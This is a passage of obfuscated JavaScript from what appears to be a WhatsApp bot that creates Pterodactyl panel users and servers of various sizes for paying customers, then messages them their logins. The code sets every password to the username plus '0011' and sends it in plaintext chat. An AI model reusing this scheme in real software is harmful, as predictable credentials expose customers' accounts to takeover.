              'limits': {
                'memory': "25240",
                'swap': 0x0,
                'disk': "25240",
                'io': 0x1f4,
                'cpu': "700"
              },
              'feature_limits': {
                'databases': 0x5,
                'backups': 0x5,
                'allocations': 0x1
              },
              'deploy': {
                'locations': [parseInt(_0x4eac01)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0x119fda = await _0x1badd8.json();
          if (_0x119fda.errors) {
            return _0x427bb7(JSON.stringify(_0x119fda.errors[0x0], null, 0x2));
          }
        }
        break;
      case "24gb":
        {
          if (!_0x43e87d && !_0x3cc2ac) {
            return _0x427bb7(mess.only.premium);
          }
          let _0x373865 = _0x4ec028.split(',');
          if (_0x373865.length < 0x2) {
            return _0x427bb7("*Format salah!*\nPenggunaan:\n" + (_0x55d820 + _0x25c23d) + " user,nomer");
          }
          let _0x5b0d03 = _0x373865[0x0];
          let _0x44cbb6 = _0x470adc.quoted ? _0x470adc.quoted.sender : _0x373865[0x1] ? _0x373865[0x1].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : _0x470adc.mentionedJid[0x0];
          let _0x31f194 = _0x5b0d03 + "24GB";
          let _0x3b520a = global.eggsnya;
          let _0x8d9137 = global.location;
          let _0x5a02dd = _0x5b0d03 + "1398@gmail.com";
          akunlo = "https://telegra.ph/file/3d91b41617cb982acf0c4.jpg";
          if (!_0x44cbb6) {
            return;
          }
          let _0x28668e = _0x5b0d03 + "0011";
          let _0x2f5bb6 = await fetch(domain + "/api/application/users", {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'email': _0x5a02dd,
              'username': _0x5b0d03,
              'first_name': _0x5b0d03,
              'last_name': _0x5b0d03,
              'language': 'en',
              'password': _0x28668e
            })
          });
          let _0x227384 = await _0x2f5bb6.json();
          if (_0x227384.errors) {
            return _0x427bb7(JSON.stringify(_0x227384.errors[0x0], null, 0x2));
          }
          let _0x1b24b1 = _0x227384.attributes;
          let _0x42392b = await fetch(domain + "/api/application/nests/5/eggs/" + _0x3b520a, {
            'method': "GET",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            }
          });
          _0x427bb7("SUCCES CREATE USER ID: " + _0x1b24b1.id);
          ctf = "Hai @" + _0x44cbb6.split`@`[0x0] + "\n\n⎙─➤ *👤USERNAME* : " + _0x1b24b1.username + "\n⎙─➤ *🔐PASSWORD* : " + _0x28668e + "\n⎙─➤ *🌐LOGIN* : " + domain + "\n\nNOTE:\n𝟭.𝗢𝗪𝗡𝗘𝗥 𝗛𝗔𝗡𝗬𝗔 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗗𝗔𝗧𝗔 𝗔𝗞𝗨𝗡 𝟭𝗫 \n𝟮.𝗝𝗔𝗡𝗚𝗔𝗡 𝗦𝗛𝗔𝗥𝗘 𝗔𝗞𝗨𝗡 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔\n𝟯.𝗡𝗢 𝗦𝗛𝗔𝗥𝗘 𝗪𝗘𝗕𝗦𝗜𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 \n𝟰.𝗡𝗢 𝗠𝗔𝗞𝗦𝗔 𝗥𝗘𝗙𝗙 \n𝟱.𝗝𝗔𝗡𝗚𝗔𝗡 𝗟𝗨𝗣𝗔 𝗕𝗜𝗟𝗔𝗡𝗚 𝗗𝗢𝗡𝗘 𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛\n𝟲. 𝗢𝗪𝗡 𝗣𝗔𝗡𝗘𝗟 : wa.me/6282291664759\n=====================================\n";
          _0x1acf89.sendMessage(_0x44cbb6, {
            'image': {
              'url': akunlo
            },
            'caption': ctf
          }, {
            'quoted': _0x1acf89.chat
          });
          let _0x2d8ee2 = await _0x42392b.json();
          let _0x575725 = _0x2d8ee2.attributes.startup;
          let _0xd270d1 = await fetch(domain + "/api/application/servers", {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'name': _0x31f194,
              'description': "PANEL BY ABYYXZ🔥⚡,TERIMAKASIH SUDAH ORDER",
              'user': _0x1b24b1.id,
              'egg': parseInt(_0x3b520a),
              'docker_image': "ghcr.io/parkervcp/yolks:nodejs_18",
              'startup': _0x575725,
              'environment': {
                'INST': "npm",
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': "npm start"
              },
              'limits': {
                'memory': "24240",
                'swap': 0x0,
                'disk': "24240",
                'io': 0x1f4,
                'cpu': "660"
              },
              'feature_limits': {
                'databases': 0x5,
                'backups': 0x5,
                'allocations': 0x1
              },
              'deploy': {
                'locations': [parseInt(_0x8d9137)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0x522fa9 = await _0xd270d1.json();
          if (_0x522fa9.errors) {
            return _0x427bb7(JSON.stringify(_0x522fa9.errors[0x0], null, 0x2));
          }
        }
        break;
      case "23gb":
        {
          if (!_0x43e87d && !_0x3cc2ac) {
            return _0x427bb7(mess.only.premium);
          }
          let _0x4b91d2 = _0x4ec028.split(',');
          if (_0x4b91d2.length < 0x2) {
            return _0x427bb7("*Format salah!*\nPenggunaan:\n" + (_0x55d820 + _0x25c23d) + " user,nomer");
          }
          let _0x106b82 = _0x4b91d2[0x0];
          let _0x3f85e9 = _0x470adc.quoted ? _0x470adc.quoted.sender : _0x4b91d2[0x1] ? _0x4b91d2[0x1].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : _0x470adc.mentionedJid[0x0];
          let _0x265e70 = _0x106b82 + "23GB";
          let _0x35a3f9 = global.eggsnya;
          let _0x21d764 = global.location;
          let _0xe41399 = _0x106b82 + "1398@gmail.com";
          akunlo = "https://telegra.ph/file/3d91b41617cb982acf0c4.jpg";
          if (!_0x3f85e9) {
            return;
          }
          let _0x1b60ae = _0x106b82 + "0011";
          let _0x3ff4d1 = await fetch(domain + "/api/application/users", {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'email': _0xe41399,
              'username': _0x106b82,
              'first_name': _0x106b82,
              'last_name': _0x106b82,
              'language': 'en',
              'password': _0x1b60ae
            })
          });
          let _0x114356 = await _0x3ff4d1.json();
          if (_0x114356.errors) {
            return _0x427bb7(JSON.stringify(_0x114356.errors[0x0], null, 0x2));
          }
          let _0x4bdad6 = _0x114356.attributes;
          let _0x48d270 = await fetch(domain + "/api/application/nests/5/eggs/" + _0x35a3f9, {
            'method': "GET",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            }
          });
          _0x427bb7("SUCCES CREATE USER ID: " + _0x4bdad6.id);
          ctf = "Hai @" + _0x3f85e9.split`@`[0x0] + "\n\n⎙─➤ *👤USERNAME* : " + _0x4bdad6.username + "\n⎙─➤ *🔐PASSWORD* : " + _0x1b60ae + "\n⎙─➤ *🌐LOGIN* : " + domain + "\n\nNOTE:\n𝟭.𝗢𝗪𝗡𝗘𝗥 𝗛𝗔𝗡𝗬𝗔 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗗𝗔𝗧𝗔 𝗔𝗞𝗨𝗡 𝟭𝗫 \n𝟮.𝗝𝗔𝗡𝗚𝗔𝗡 𝗦𝗛𝗔𝗥𝗘 𝗔𝗞𝗨𝗡 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔\n𝟯.𝗡𝗢 𝗦𝗛𝗔𝗥𝗘 𝗪𝗘𝗕𝗦𝗜𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 \n𝟰.𝗡𝗢 𝗠𝗔𝗞𝗦𝗔 𝗥𝗘𝗙𝗙 \n𝟱.𝗝𝗔𝗡𝗚𝗔𝗡 𝗟𝗨𝗣𝗔 𝗕𝗜𝗟𝗔𝗡𝗚 𝗗𝗢𝗡𝗘 𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛\n𝟲. 𝗢𝗪𝗡 𝗣𝗔𝗡𝗘𝗟 : wa.me/6282291664759\n=====================================\n";
          _0x1acf89.sendMessage(_0x3f85e9, {
            'image': {
              'url': akunlo
            },
            'caption': ctf
          }, {
            'quoted': _0x1acf89.chat
          });
          let _0x4afd98 = await _0x48d270.json();
          let _0x143b42 = _0x4afd98.attributes.startup;
          let _0x22c6e4 = await fetch(domain + "/api/application/servers", {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'name': _0x265e70,
              'description': "PANEL BY ABYYXZ🔥⚡,TERIMAKASIH SUDAH ORDER",
              'user': _0x4bdad6.id,
              'egg': parseInt(_0x35a3f9),
              'docker_image': "ghcr.io/parkervcp/yolks:nodejs_18",
              'startup': _0x143b42,
              'environment': {
                'INST': "npm",
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': "npm start"
              },
              'limits': {
                'memory': "23240",
                'swap': 0x0,
                'disk': "23240",
                'io': 0x1f4,
                'cpu': "610"
              },
              'feature_limits': {
                'databases': 0x5,
                'backups': 0x5,
                'allocations': 0x1
              },
              'deploy': {
                'locations': [parseInt(_0x21d764)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0x3c4bc0 = await _0x22c6e4.json();
          if (_0x3c4bc0.errors) {
            return _0x427bb7(JSON.stringify(_0x3c4bc0.errors[0x0], null, 0x2));
          }
        }
        break;
      case "22gb":
        {
          if (!_0x43e87d && !_0x3cc2ac) {
            return _0x427bb7(mess.only.premium);
          }
          let _0x1ccb2c = _0x4ec028.split(',');
          if (_0x1ccb2c.length < 0x2) {
            return _0x427bb7("*Format salah!*\nPenggunaan:\n" + (_0x55d820 + _0x25c23d) + " user,nomer");
          }
          let _0x456dd3 = _0x1ccb2c[0x0];
          let _0x4ec7a4 = _0x470adc.quoted ? _0x470adc.quoted.sender : _0x1ccb2c[0x1] ? _0x1ccb2c[0x1].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : _0x470adc.mentionedJid[0x0];
          let _0x538a9d = _0x456dd3 + "22GB";
          let _0x322ebc = global.eggsnya;
          let _0x4c6cb0 = global.location;
          let _0x72685d = _0x456dd3 + "1398@gmail.com";
          akunlo = "https://telegra.ph/file/3d91b41617cb982acf0c4.jpg";
          if (!_0x4ec7a4) {
            return;
          }
          let _0x2c52c6 = _0x456dd3 + "0011";
          let _0xa54f2f = await fetch(domain + "/api/application/users", {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'email': _0x72685d,
              'username': _0x456dd3,
              'first_name': _0x456dd3,
              'last_name': _0x456dd3,
              'language': 'en',
              'password': _0x2c52c6
            })
          });
          let _0xca9857 = await _0xa54f2f.json();
          if (_0xca9857.errors) {
            return _0x427bb7(JSON.stringify(_0xca9857.errors[0x0], null, 0x2));
          }
          let _0x478202 = _0xca9857.attributes;
          let _0x4e25f4 = await fetch(domain + "/api/application/nests/5/eggs/" + _0x322ebc, {
            'method': "GET",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            }
          });
          _0x427bb7("SUCCES CREATE USER ID: " + _0x478202.id);
          ctf = "Hai @" + _0x4ec7a4.split`@`[0x0] + "\n\n⎙─➤ *👤USERNAME* : " + _0x478202.username + "\n⎙─➤ *🔐PASSWORD* : " + _0x2c52c6 + "\n⎙─➤ *🌐LOGIN* : " + domain + "\n\nNOTE:\n𝟭.𝗢𝗪𝗡𝗘𝗥 𝗛𝗔𝗡𝗬𝗔 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗗𝗔𝗧𝗔 𝗔𝗞𝗨𝗡 𝟭𝗫 \n𝟮.𝗝𝗔𝗡𝗚𝗔𝗡 𝗦𝗛𝗔𝗥𝗘 𝗔𝗞𝗨𝗡 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔\n𝟯.𝗡𝗢 𝗦𝗛𝗔𝗥𝗘 𝗪𝗘𝗕𝗦𝗜𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 \n𝟰.𝗡𝗢 𝗠𝗔𝗞𝗦𝗔 𝗥𝗘𝗙𝗙 \n𝟱.𝗝𝗔𝗡𝗚𝗔𝗡 𝗟𝗨𝗣𝗔 𝗕𝗜𝗟𝗔𝗡𝗚 𝗗𝗢𝗡𝗘 𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛\n𝟲. 𝗢𝗪𝗡 𝗣𝗔𝗡𝗘𝗟 : wa.me/6282291664759\n=====================================\n";
          _0x1acf89.sendMessage(_0x4ec7a4, {
            'image': {
              'url': akunlo
            },
            'caption': ctf
          }, {
            'quoted': _0x1acf89.chat
          });
          let _0x136e00 = await _0x4e25f4.json();
          let _0x1a2d59 = _0x136e00.attributes.startup;
          let _0x13c071 = await fetch(domain + "/api/application/servers", {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'name': _0x538a9d,
              'description': "PANEL BY ABYYXZ🔥⚡,TERIMAKASIH SUDAH ORDER",
              'user': _0x478202.id,
              'egg': parseInt(_0x322ebc),
              'docker_image': "ghcr.io/parkervcp/yolks:nodejs_18",
              'startup': _0x1a2d59,
              'environment': {
                'INST': "npm",
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': "npm start"
              },
              'limits': {
                'memory': "22240",
                'swap': 0x0,
                'disk': "22240",
                'io': 0x1f4,
                'cpu': "590"
              },
              'feature_limits': {
                'databases': 0x5,
                'backups': 0x5,
                'allocations': 0x1
              },
              'deploy': {
                'locations': [parseInt(_0x4c6cb0)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0x5da4dc = await _0x13c071.json();
          if (_0x5da4dc.errors) {
            return _0x427bb7(JSON.stringify(_0x5da4dc.errors[0x0], null, 0x2));
          }
        }
        break;
      case "21gb":
        {
          if (!_0x43e87d && !_0x3cc2ac) {
            return _0x427bb7(mess.only.premium);
          }
          let _0x1c4b18 = _0x4ec028.split(',');
          if (_0x1c4b18.length < 0x2) {
            return _0x427bb7("*Format salah!*\nPenggunaan:\n" + (_0x55d820 + _0x25c23d) + " user,nomer");
          }
          let _0x76e25d = _0x1c4b18[0x0];
          let _0x13c254 = _0x470adc.quoted ? _0x470adc.quoted.sender : _0x1c4b18[0x1] ? _0x1c4b18[0x1].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : _0x470adc.mentionedJid[0x0];
          let _0x4a2cbe = _0x76e25d + "21GB";
          let _0x53508a = global.eggsnya;
          let _0x2cc841 = global.location;
          let _0x247eb3 = _0x76e25d + "1398@gmail.com";
          akunlo = "https://telegra.ph/file/3d91b41617cb982acf0c4.jpg";
          if (!_0x13c254) {
            return;
          }
          let _0x260d3e = _0x76e25d + "0011";
          let _0x5710b5 = await fetch(domain + "/api/application/users", {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'email': _0x247eb3,
              'username': _0x76e25d,
              'first_name': _0x76e25d,
              'last_name': _0x76e25d,
              'language': 'en',
              'password': _0x260d3e
            })
          });
          let _0xb44784 = await _0x5710b5.json();
          if (_0xb44784.errors) {
            return _0x427bb7(JSON.stringify(_0xb44784.errors[0x0], null, 0x2));
          }
          let _0x17ef3f = _0xb44784.attributes;
          let _0x227d56 = await fetch(domain + "/api/application/nests/5/eggs/" + _0x53508a, {
            'method': "GET",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            }
          });
          _0x427bb7("SUCCES CREATE USER ID: " + _0x17ef3f.id);
          ctf = "Hai @" + _0x13c254.split`@`[0x0] + "\n\n⎙─➤ *👤USERNAME* : " + _0x17ef3f.username + "\n⎙─➤ *🔐PASSWORD* : " + _0x260d3e + "\n⎙─➤ *🌐LOGIN* : " + domain + "\n\nNOTE:\n𝟭.𝗢𝗪𝗡𝗘𝗥 𝗛𝗔𝗡𝗬𝗔 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗗𝗔𝗧𝗔 𝗔𝗞𝗨𝗡 𝟭𝗫 \n𝟮.𝗝𝗔𝗡𝗚𝗔𝗡 𝗦𝗛𝗔𝗥𝗘 𝗔𝗞𝗨𝗡 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔\n𝟯.𝗡𝗢 𝗦𝗛𝗔𝗥𝗘 𝗪𝗘𝗕𝗦𝗜𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 \n𝟰.𝗡𝗢 𝗠𝗔𝗞𝗦𝗔 𝗥𝗘𝗙𝗙 \n𝟱.𝗝𝗔𝗡𝗚𝗔𝗡 𝗟𝗨𝗣𝗔 𝗕𝗜𝗟𝗔𝗡𝗚 𝗗𝗢𝗡𝗘 𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛\n𝟲. 𝗢𝗪𝗡 𝗣𝗔𝗡𝗘𝗟 : wa.me/6282291664759\n=====================================\n";
          _0x1acf89.sendMessage(_0x13c254, {
            'image': {
              'url': akunlo
            },
            'caption': ctf
          }, {
            'quoted': _0x1acf89.chat
          });
          let _0x216d5a = await _0x227d56.json();
          let _0x4da224 = _0x216d5a.attributes.startup;
          let _0x286f33 = await fetch(domain + "/api/application/servers", {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'name': _0x4a2cbe,
              'description': "PANEL BY ABYYXZ🔥⚡,TERIMAKASIH SUDAH ORDER",
              'user': _0x17ef3f.id,
              'egg': parseInt(_0x53508a),
              'docker_image': "ghcr.io/parkervcp/yolks:nodejs_18",
              'startup': _0x4da224,
              'environment': {
                'INST': "npm",
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': "npm start"
              },
              'limits': {
                'memory': "21240",
                'swap': 0x0,
                'disk': "21240",
                'io': 0x1f4,
                'cpu': "570"
              },
              'feature_limits': {
                'databases': 0x5,
                'backups': 0x5,
                'allocations': 0x1
              },
              'deploy': {
                'locations': [parseInt(_0x2cc841)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0x5377cd = await _0x286f33.json();
          if (_0x5377cd.errors) {
            return _0x427bb7(JSON.stringify(_0x5377cd.errors[0x0], null, 0x2));
          }
        }
        break;
      case "20gb":
        {
          if (!_0x43e87d && !_0x3cc2ac) {
            return _0x427bb7(mess.only.premium);
          }
          let _0x401f11 = _0x4ec028.split(',');
          if (_0x401f11.length < 0x2) {
            return _0x427bb7("*Format salah!*\nPenggunaan:\n" + (_0x55d820 + _0x25c23d) + " user,nomer");
          }
          let _0x49c8bc = _0x401f11[0x0];
          let _0x24eca3 = _0x470adc.quoted ? _0x470adc.quoted.sender : _0x401f11[0x1] ? _0x401f11[0x1].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : _0x470adc.mentionedJid[0x0];
          let _0x7b07fc = _0x49c8bc + "20GB";
          let _0x39bae3 = global.eggsnya;
          let _0xccf2cc = global.location;
          let _0x1950f7 = _0x49c8bc + "1398@gmail.com";
          akunlo = "https://telegra.ph/file/3d91b41617cb982acf0c4.jpg";
          if (!_0x24eca3) {
            return;
          }
          let _0xff8b34 = _0x49c8bc + "0011";
          let _0x16adfa = await fetch(domain + "/api/application/users", {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'email': _0x1950f7,
              'username': _0x49c8bc,
              'first_name': _0x49c8bc,
              'last_name': _0x49c8bc,
              'language': 'en',
              'password': _0xff8b34
            })
          });
          let _0x4aa8b3 = await _0x16adfa.json();
          if (_0x4aa8b3.errors) {
            return _0x427bb7(JSON.stringify(_0x4aa8b3.errors[0x0], null, 0x2));
          }
          let _0x58d7d3 = _0x4aa8b3.attributes;
          let _0x231789 = await fetch(domain + "/api/application/nests/5/eggs/" + _0x39bae3, {
            'method': "GET",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            }
          });
          _0x427bb7("SUCCES CREATE USER ID: " + _0x58d7d3.id);
          ctf = "Hai @" + _0x24eca3.split`@`[0x0] + "\n\n⎙─➤ *👤USERNAME* : " + _0x58d7d3.username + "\n⎙─➤ *🔐PASSWORD* : " + _0xff8b34 + "\n⎙─➤ *🌐LOGIN* : " + domain + "\n\nNOTE:\n𝟭.𝗢𝗪𝗡𝗘𝗥 𝗛𝗔𝗡𝗬𝗔 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗗𝗔𝗧𝗔 𝗔𝗞𝗨𝗡 𝟭𝗫 \n𝟮.𝗝𝗔𝗡𝗚𝗔𝗡 𝗦𝗛𝗔𝗥𝗘 𝗔𝗞𝗨𝗡 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔\n𝟯.𝗡𝗢 𝗦𝗛𝗔𝗥𝗘 𝗪𝗘𝗕𝗦𝗜𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 \n𝟰.𝗡𝗢 𝗠𝗔𝗞𝗦𝗔 𝗥𝗘𝗙𝗙 \n𝟱.𝗝𝗔𝗡𝗚𝗔𝗡 𝗟𝗨𝗣𝗔 𝗕𝗜𝗟𝗔𝗡𝗚 𝗗𝗢𝗡𝗘 𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛\n𝟲. 𝗢𝗪𝗡 𝗣𝗔𝗡𝗘𝗟 : wa.me/6282291664759\n=====================================\n";
          _0x1acf89.sendMessage(_0x24eca3, {
            'image': {
              'url': akunlo
            },
            'caption': ctf
          }, {
            'quoted': _0x1acf89.chat
          });
          let _0x26c0c4 = await _0x231789.json();
          let _0x2a807d = _0x26c0c4.attributes.startup;
          let _0xb734bc = await fetch(domain + "/api/application/servers", {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'name': _0x7b07fc,
              'description': "PANEL BY ABYYXZ🔥⚡,TERIMAKASIH SUDAH ORDER",
              'user': _0x58d7d3.id,
              'egg': parseInt(_0x39bae3),
              'docker_image': "ghcr.io/parkervcp/yolks:nodejs_18",
              'startup': _0x2a807d,
              'environment': {
                'INST': "npm",
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': "npm start"
              },
              'limits': {
                'memory': "20240",
                'swap': 0x0,
                'disk': "20240",
                'io': 0x1f4,
                'cpu': "530"
              },
              'feature_limits': {
                'databases': 0x5,
                'backups': 0x5,
                'allocations': 0x1
              },
              'deploy': {
                'locations': [parseInt(_0xccf2cc)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0x5de905 = await _0xb734bc.json();
          if (_0x5de905.errors) {
            return _0x427bb7(JSON.stringify(_0x5de905.errors[0x0], null, 0x2));
          }
        }
        break;
      case "19gb":
        {
          if (!_0x43e87d && !_0x3cc2ac) {
            return _0x427bb7(mess.only.premium);
          }
          let _0xf01a28 = _0x4ec028.split(',');
          if (_0xf01a28.length < 0x2) {
            return _0x427bb7("*Format salah!*\nPenggunaan:\n" + (_0x55d820 + _0x25c23d) + " user,nomer");
          }
          let _0x479ad8 = _0xf01a28[0x0];
          let _0x19819d = _0x470adc.quoted ? _0x470adc.quoted.sender : _0xf01a28[0x1] ? _0xf01a28[0x1].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : _0x470adc.mentionedJid[0x0];
          let _0x36dd8f = _0x479ad8 + "19GB";
          let _0x5bdd7e = global.eggsnya;
          let _0x1c5735 = global.location;
          let _0x8e8967 = _0x479ad8 + "1398@gmail.com";
          akunlo = "https://telegra.ph/file/3d91b41617cb982acf0c4.jpg";
          if (!_0x19819d) {
            return;
          }
          let _0x373d9e = _0x479ad8 + "0011";
          let _0x334811 = await fetch(domain + "/api/application/users", {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'email': _0x8e8967,
              'username': _0x479ad8,
              'first_name': _0x479ad8,
              'last_name': _0x479ad8,
              'language': 'en',
              'password': _0x373d9e
            })
          });
          let _0x597d73 = await _0x334811.json();
          if (_0x597d73.errors) {
            return _0x427bb7(JSON.stringify(_0x597d73.errors[0x0], null, 0x2));
          }
          let _0x14daaf = _0x597d73.attributes;
          let _0x36a933 = await fetch(domain + "/api/application/nests/5/eggs/" + _0x5bdd7e, {
            'method': "GET",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            }
          });
          _0x427bb7("SUCCES CREATE USER ID: " + _0x14daaf.id);
          ctf = "Hai @" + _0x19819d.split`@`[0x0] + "\n\n⎙─➤ *👤USERNAME* : " + _0x14daaf.username + "\n⎙─➤ *🔐PASSWORD* : " + _0x373d9e + "\n⎙─➤ *🌐LOGIN* : " + domain + "\n\nNOTE:\n𝟭.𝗢𝗪𝗡𝗘𝗥 𝗛𝗔𝗡𝗬𝗔 𝗠𝗘𝗡𝗚𝗜𝗥𝗜𝗠 𝗗𝗔𝗧𝗔 𝗔𝗞𝗨𝗡 𝟭𝗫 \n𝟮.𝗝𝗔𝗡𝗚𝗔𝗡 𝗦𝗛𝗔𝗥𝗘 𝗔𝗞𝗨𝗡 𝗣𝗔𝗡𝗘𝗟 𝗔𝗡𝗗𝗔\n𝟯.𝗡𝗢 𝗦𝗛𝗔𝗥𝗘 𝗪𝗘𝗕𝗦𝗜𝗧𝗘 𝗣𝗔𝗡𝗘𝗟 \n𝟰.𝗡𝗢 𝗠𝗔𝗞𝗦𝗔 𝗥𝗘𝗙𝗙 \n𝟱.𝗝𝗔𝗡𝗚𝗔𝗡 𝗟𝗨𝗣𝗔 𝗕𝗜𝗟𝗔𝗡𝗚 𝗗𝗢𝗡𝗘 𝗧𝗘𝗥𝗜𝗠𝗔𝗞𝗔𝗦𝗜𝗛\n𝟲. 𝗢𝗪𝗡 𝗣𝗔𝗡𝗘𝗟 : wa.me/6282291664759\n=====================================\n";
          _0x1acf89.sendMessage(_0x19819d, {
            'image': {
              'url': akunlo
            },
            'caption': ctf
          }, {
            'quoted': _0x1acf89.chat
          });
          let _0x3447d1 = await _0x36a933.json();
          let _0x3b0224 = _0x3447d1.attributes.startup;
          let _0x352ce4 = await fetch(domain + "/api/application/servers", {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'name': _0x36dd8f,
              'description': "PANEL BY ABYYXZ🔥⚡,TERIMAKASIH SUDAH ORDER",
              'user': _0x14daaf.id,
              'egg': parseInt(_0x5bdd7e),
              'docker_image': "ghcr.io/parkervcp/yolks:nodejs_18",
              'startup': _0x3b0224,
              'environment': {
                'INST': "npm",
                'USER_UPLOAD': '0',
                'AUTO_UPDATE': '0',
                'CMD_RUN': "npm start"
              },
              'limits': {
                'memory': "19240",
                'swap': 0x0,
                'disk': "19240",
                'io': 0x1f4,
                'cpu': "500"
              },
              'feature_limits': {
                'databases': 0x5,
                'backups': 0x5,
                'allocations': 0x1
              },
              'deploy': {
                'locations': [parseInt(_0x1c5735)],
                'dedicated_ip': false,
                'port_range': []
              }
            })
          });
          let _0x40f44c = await _0x352ce4.json();
          if (_0x40f44c.errors) {
            return _0x427bb7(JSON.stringify(_0x40f44c.errors[0x0], null, 0x2));
          }
        }
        break;
      case "18gb":
        {
          if (!_0x43e87d && !_0x3cc2ac) {
            return _0x427bb7(mess.only.premium);
          }
          let _0x5de1ac = _0x4ec028.split(',');
          if (_0x5de1ac.length < 0x2) {
            return _0x427bb7("*Format salah!*\nPenggunaan:\n" + (_0x55d820 + _0x25c23d) + " user,nomer");
          }
          let _0x568843 = _0x5de1ac[0x0];
          let _0x46143e = _0x470adc.quoted ? _0x470adc.quoted.sender : _0x5de1ac[0x1] ? _0x5de1ac[0x1].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : _0x470adc.mentionedJid[0x0];
          let _0x44f4ef = _0x568843 + "18GB";
          let _0x262b6f = global.eggsnya;
          let _0xe417af = global.location;
          let _0x17ff2e = _0x568843 + "1398@gmail.com";
          akunlo = "https://telegra.ph/file/3d91b41617cb982acf0c4.jpg";
          if (!_0x46143e) {
            return;
          }
          let _0x781db2 = _0x568843 + "0011";
          let _0x575a2d = await fetch(domain + "/api/application/users", {
            'method': "POST",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
              'Authorization': "Bearer " + apikey
            },
            'body': JSON.stringify({
              'email': _0x17ff2e,
              'username': _0x568843,
              'first_name': _0x568843,
              'last_name': _0x568843,
              'language': 'en',
              'password': _0x781db2
            })
          });
          let _0x306e16 = await _0x575a2d.json();
          if (_0x306e16.errors) {
            return _0x427bb7(JSON.stringify(_0x306e16.errors[0x0], null, 0x2));
          }
          let _0x47c478 = _0x306e16.attributes;
          let _0x4ff9bb = await fetch(domain + "/api/application/nests/5/eggs/" + _0x262b6f, {
            'method': "GET",
            'headers': {
              'Accept': "application/json",
              'Content-Type': "application/json",
